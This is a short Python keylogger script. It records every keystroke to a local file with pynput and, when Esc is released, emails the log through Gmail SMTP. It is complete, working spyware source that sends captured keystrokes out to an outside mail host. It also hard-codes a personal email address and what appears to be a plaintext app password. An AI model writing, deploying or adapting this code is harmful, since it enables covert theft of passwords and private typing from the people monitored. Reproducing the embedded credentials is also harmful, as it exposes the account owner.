from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
file=open("logs.txt","w")
def on_press(key):
    try:
        if key==keyboard.Key.enter:
            file.write("\n")
        if key==keyboard.Key.space:
            file.write(" ") 
        if key==keyboard.Key.tab:
            file.write("\t")
        else:
            file.write("{0}".format(key.char))
    except AttributeError:
        file.write(' {0} '.format(key))
def on_release(key):
    if key == keyboard.Key.esc:
        file.flush()
        file.close()
        smtp_port=587
        smtp_server="smtp.gmail.com"
        email_from="sawantvarad0@gmail.com"
        email_to="sawantvarad0@gmail.com"
        password="nwvhiigzqrawezwg"
        msg=MIMEMultipart()
        msg['From']=email_from
        msg['To']=email_to
        file1=open("logs.txt",'r')
        file_content=file1.read()
        attachment=MIMEText(file_content)
        attachment.add_header('Content-Disposition', 'attachment', filename='log.txt')
        msg.attach(attachment)
        with smtplib.SMTP(smtp_server,smtp_port) as server:
            server.starttls()
            server.login(email_from,password)
            server.send_message(msg)
        return False
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
